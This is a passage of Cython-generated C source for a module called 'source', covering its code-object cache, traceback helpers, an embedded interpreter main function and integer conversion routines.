             start = mid + 1;
        } else {
            return mid;
        }
    }
    if (code_line <= entries[mid].code_line) {
        return mid;
    } else {
        return mid + 1;
    }
}
static PyCodeObject *__pyx_find_code_object(int code_line) {
    PyCodeObject* code_object;
    int pos;
    if (unlikely(!code_line) || unlikely(!__pyx_code_cache.entries)) {
        return NULL;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if (unlikely(pos >= __pyx_code_cache.count) || unlikely(__pyx_code_cache.entries[pos].code_line != code_line)) {
        return NULL;
    }
    code_object = __pyx_code_cache.entries[pos].code_object;
    Py_INCREF(code_object);
    return code_object;
}
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object) {
    int pos, i;
    __Pyx_CodeObjectCacheEntry* entries = __pyx_code_cache.entries;
    if (unlikely(!code_line)) {
        return;
    }
    if (unlikely(!entries)) {
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Malloc(64*sizeof(__Pyx_CodeObjectCacheEntry));
        if (likely(entries)) {
            __pyx_code_cache.entries = entries;
            __pyx_code_cache.max_count = 64;
            __pyx_code_cache.count = 1;
            entries[0].code_line = code_line;
            entries[0].code_object = code_object;
            Py_INCREF(code_object);
        }
        return;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if ((pos < __pyx_code_cache.count) && unlikely(__pyx_code_cache.entries[pos].code_line == code_line)) {
        PyCodeObject* tmp = entries[pos].code_object;
        entries[pos].code_object = code_object;
        Py_DECREF(tmp);
        return;
    }
    if (__pyx_code_cache.count == __pyx_code_cache.max_count) {
        int new_max = __pyx_code_cache.max_count + 64;
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Realloc(
            __pyx_code_cache.entries, ((size_t)new_max) * sizeof(__Pyx_CodeObjectCacheEntry));
        if (unlikely(!entries)) {
            return;
        }
        __pyx_code_cache.entries = entries;
        __pyx_code_cache.max_count = new_max;
    }
    for (i=__pyx_code_cache.count; i>pos; i--) {
        entries[i] = entries[i-1];
    }
    entries[pos].code_line = code_line;
    entries[pos].code_object = code_object;
    __pyx_code_cache.count++;
    Py_INCREF(code_object);
}

/* AddTraceback */
#include "compile.h"
#include "frameobject.h"
#include "traceback.h"
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
static PyCodeObject* __Pyx_CreateCodeObjectForTraceback(
            const char *funcname, int c_line,
            int py_line, const char *filename) {
    PyCodeObject *py_code = NULL;
    PyObject *py_funcname = NULL;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_srcfile = NULL;
    py_srcfile = PyString_FromString(filename);
    if (!py_srcfile) goto bad;
    #endif
    if (c_line) {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        #else
        py_funcname = PyUnicode_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        funcname = PyUnicode_AsUTF8(py_funcname);
        if (!funcname) goto bad;
        #endif
    }
    else {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromString(funcname);
        if (!py_funcname) goto bad;
        #endif
    }
    #if PY_MAJOR_VERSION < 3
    py_code = __Pyx_PyCode_New(
        0,
        0,
        0,
        0,
        0,
        __pyx_empty_bytes, /*PyObject *code,*/
        __pyx_empty_tuple, /*PyObject *consts,*/
        __pyx_empty_tuple, /*PyObject *names,*/
        __pyx_empty_tuple, /*PyObject *varnames,*/
        __pyx_empty_tuple, /*PyObject *freevars,*/
        __pyx_empty_tuple, /*PyObject *cellvars,*/
        py_srcfile,   /*PyObject *filename,*/
        py_funcname,  /*PyObject *name,*/
        py_line,
        __pyx_empty_bytes  /*PyObject *lnotab*/
    );
    Py_DECREF(py_srcfile);
    #else
    py_code = PyCode_NewEmpty(filename, funcname, py_line);
    #endif
    Py_XDECREF(py_funcname);  // XDECREF since it's only set on Py3 if cline
    return py_code;
bad:
    Py_XDECREF(py_funcname);
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_srcfile);
    #endif
    return NULL;
}
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename) {
    PyCodeObject *py_code = 0;
    PyFrameObject *py_frame = 0;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject *ptype, *pvalue, *ptraceback;
    if (c_line) {
        c_line = __Pyx_CLineForTraceback(tstate, c_line);
    }
    py_code = __pyx_find_code_object(c_line ? -c_line : py_line);
    if (!py_code) {
        __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
        py_code = __Pyx_CreateCodeObjectForTraceback(
            funcname, c_line, py_line, filename);
        if (!py_code) {
            /* If the code object creation fails, then we should clear the
               fetched exception references and propagate the new exception */
            Py_XDECREF(ptype);
            Py_XDECREF(pvalue);
            Py_XDECREF(ptraceback);
            goto bad;
        }
        __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
        __pyx_insert_code_object(c_line ? -c_line : py_line, py_code);
    }
    py_frame = PyFrame_New(
        tstate,            /*PyThreadState *tstate,*/
        py_code,           /*PyCodeObject *code,*/
        __pyx_d,    /*PyObject *globals,*/
        0                  /*PyObject *locals*/
    );
    if (!py_frame) goto bad;
    __Pyx_PyFrame_SetLineNumber(py_frame, py_line);
    PyTraceBack_Here(py_frame);
bad:
    Py_XDECREF(py_code);
    Py_XDECREF(py_frame);
}

/* MainFunction */
#ifdef __FreeBSD__
#include <floatingpoint.h>
#endif
#if PY_MAJOR_VERSION < 3
int main(int argc, char** argv) {
#elif defined(WIN32) || defined(MS_WINDOWS)
int wmain(int argc, wchar_t **argv) {
#else
static int __Pyx_main(int argc, wchar_t **argv) {
#endif
    /* 754 requires that FP exceptions run in "no stop" mode by default,
     * and until C vendors implement C99's ways to control FP exceptions,
     * Python requires non-stop mode.  Alas, some platforms enable FP
     * exceptions by default.  Here we disable them.
     */
#ifdef __FreeBSD__
    fp_except_t m;
    m = fpgetmask();
    fpsetmask(m & ~FP_X_OFL);
#endif
    if (argc && argv)
        Py_SetProgramName(argv[0]);
    Py_Initialize();
    if (argc && argv)
        PySys_SetArgv(argc, argv);
    {
      PyObject* m = NULL;
      __pyx_module_is_main_source = 1;
      #if PY_MAJOR_VERSION < 3
          initsource();
      #elif CYTHON_PEP489_MULTI_PHASE_INIT
          m = PyInit_source();
          if (!PyModule_Check(m)) {
              PyModuleDef *mdef = (PyModuleDef *) m;
              PyObject *modname = PyUnicode_FromString("__main__");
              m = NULL;
              if (modname) {
                  m = PyModule_NewObject(modname);
                  Py_DECREF(modname);
                  if (m) PyModule_ExecDef(m, mdef);
              }
          }
      #else
          m = PyInit_source();
      #endif
      if (PyErr_Occurred()) {
          PyErr_Print();
          #if PY_MAJOR_VERSION < 3
          if (Py_FlushLine()) PyErr_Clear();
          #endif
          return 1;
      }
      Py_XDECREF(m);
    }
#if PY_VERSION_HEX < 0x03060000
    Py_Finalize();
#else
    if (Py_FinalizeEx() < 0)
        return 2;
#endif
    return 0;
}
#if PY_MAJOR_VERSION >= 3 && !defined(WIN32) && !defined(MS_WINDOWS)
#include <locale.h>
static wchar_t*
__Pyx_char2wchar(char* arg)
{
    wchar_t *res;
#ifdef HAVE_BROKEN_MBSTOWCS
    /* Some platforms have a broken implementation of
     * mbstowcs which does not count the characters that
     * would result from conversion.  Use an upper bound.
     */
    size_t argsize = strlen(arg);
#else
    size_t argsize = mbstowcs(NULL, arg, 0);
#endif
    size_t count;
    unsigned char *in;
    wchar_t *out;
#ifdef HAVE_MBRTOWC
    mbstate_t mbs;
#endif
    if (argsize != (size_t)-1) {
        res = (wchar_t *)malloc((argsize+1)*sizeof(wchar_t));
        if (!res)
            goto oom;
        count = mbstowcs(res, arg, argsize+1);
        if (count != (size_t)-1) {
            wchar_t *tmp;
            /* Only use the result if it contains no
               surrogate characters. */
            for (tmp = res; *tmp != 0 &&
                     (*tmp < 0xd800 || *tmp > 0xdfff); tmp++)
                ;
            if (*tmp == 0)
                return res;
        }
        free(res);
    }
#ifdef HAVE_MBRTOWC
    /* Overallocate; as multi-byte characters are in the argument, the
       actual output could use less memory. */
    argsize = strlen(arg) + 1;
    res = (wchar_t *)malloc(argsize*sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    memset(&mbs, 0, sizeof mbs);
    while (argsize) {
        size_t converted = mbrtowc(out, (char*)in, argsize, &mbs);
        if (converted == 0)
            break;
        if (converted == (size_t)-2) {
            /* Incomplete character. This should never happen,
               since we provide everything that we have -
               unless there is a bug in the C library, or I
               misunderstood how mbrtowc works. */
            fprintf(stderr, "unexpected mbrtowc result -2\\n");
            free(res);
            return NULL;
        }
        if (converted == (size_t)-1) {
            /* Conversion error. Escape as UTF-8b, and start over
               in the initial shift state. */
            *out++ = 0xdc00 + *in++;
            argsize--;
            memset(&mbs, 0, sizeof mbs);
            continue;
        }
        if (*out >= 0xd800 && *out <= 0xdfff) {
            /* Surrogate character.  Escape the original
               byte sequence with surrogateescape. */
            argsize -= converted;
            while (converted--)
                *out++ = 0xdc00 + *in++;
            continue;
        }
        in += converted;
        argsize -= converted;
        out++;
    }
#else
    /* Cannot use C locale for escaping; manually escape as if charset
       is ASCII (i.e. escape all bytes > 128. This will still roundtrip
       correctly in the locale's charset, which must be an ASCII superset. */
    res = (wchar_t *)malloc((strlen(arg)+1)*sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    while(*in)
        if(*in < 128)
            *out++ = *in++;
        else
            *out++ = 0xdc00 + *in++;
    *out = 0;
#endif
    return res;
oom:
    fprintf(stderr, "out of memory\\n");
    return NULL;
}
int
main(int argc, char **argv)
{
    if (!argc) {
        return __Pyx_main(0, NULL);
    }
    else {
        int i, res;
        wchar_t **argv_copy = (wchar_t **)malloc(sizeof(wchar_t*)*argc);
        wchar_t **argv_copy2 = (wchar_t **)malloc(sizeof(wchar_t*)*argc);
        char *oldloc = strdup(setlocale(LC_ALL, NULL));
        if (!argv_copy || !argv_copy2 || !oldloc) {
            fprintf(stderr, "out of memory\\n");
            free(argv_copy);
            free(argv_copy2);
            free(oldloc);
            return 1;
        }
        res = 0;
        setlocale(LC_ALL, "");
        for (i = 0; i < argc; i++) {
            argv_copy2[i] = argv_copy[i] = __Pyx_char2wchar(argv[i]);
            if (!argv_copy[i]) res = 1;
        }
        setlocale(LC_ALL, oldloc);
        free(oldloc);
        if (res == 0)
            res = __Pyx_main(argc, argv_copy);
        for (i = 0; i < argc; i++) {
#if PY_VERSION_HEX < 0x03050000
            free(argv_copy2[i]);
#else
            PyMem_RawFree(argv_copy2[i]);
#endif
        }
        free(argv_copy);
        free(argv_copy2);
        return res;
    }
}
#endif

/* CIntToPy */
    static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
    if (is_unsigned) {
        if (sizeof(long) < sizeof(long)) {
            return PyInt_FromLong((long) value);
        } else if (sizeof(long) <= sizeof(unsigned long)) {
            return PyLong_FromUnsignedLong((unsigned long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
            return PyLong_FromUnsignedLongLong((unsigned PY_LONG_LONG) value);
#endif
        }
    } else {
        if (sizeof(long) <= sizeof(long)) {
            return PyInt_FromLong((long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
            return PyLong_FromLongLong((PY_LONG_LONG) value);
#endif
        }
    }
    {
        int one = 1; int little = (int)*(unsigned char *)&one;
        unsigned char *bytes = (unsigned char *)&value;
        return _PyLong_FromByteArray(bytes, sizeof(long),
                                     little, !is_unsigned);
    }
}

/* CIntFromPyVerify */
    #define __PYX_VERIFY_RETURN_INT(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 0)
#define __PYX_VERIFY_RETURN_INT_EXC(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 1)
#define __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, exc)\
    {\
        func_type value = func_value;\
        if (sizeof(target_type) < sizeof(func_type)) {\
            if (unlikely(value != (func_type) (target_type) value)) {\
                func_type zero = 0;\
                if (exc && unlikely(value == (func_type)-1 && PyErr_Occurred()))\
                    return (target_type) -1;\
                if (is_unsigned && unlikely(value < zero))\
                    goto raise_neg_overflow;\
                else\
                    goto raise_overflow;\
            }\
        }\
        return (target_type) value;\
    }

/* CIntFromPy */
    static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(long) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(long, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (long) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case  1: __PYX_VERIFY_RETURN_INT(long, digit, digits[0])
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 2 * PyLong_SHIFT) {
                            return (long) (((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 3 * PyLong_SHIFT) {
                            return (long) (((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 4 * PyLong_SHIFT) {
                            return (long) (((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (long) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(long) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case -1: __PYX_VERIFY_RETURN_INT(long, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(long,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(long) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) ((((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) ((((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) ((((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(long) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            long val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (long) -1;
        }
    } else {
        long val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (long) -1;
        val = __Pyx_PyInt_As_long(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to long");
    return (long) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to long");
    return (long) -1;
}

/* CIntFromPy */
    static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const int neg_one = (int) -1, const_zero = (int) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(int) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(int, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (int) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case  1: __PYX_VERIFY_RETURN_INT(int, digit, digits[0])
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 2 * PyLong_SHIFT) {
                            return (int) (((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 3 * PyLong_SHIFT) {
                            return (int) (((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 4 * PyLong_SHIFT) {
                            return (int) (((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (int) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(int) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case -1: __PYX_VERIFY_RETURN_INT(int, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(int,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(int) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) ((((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) ((((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) ((((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(int) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
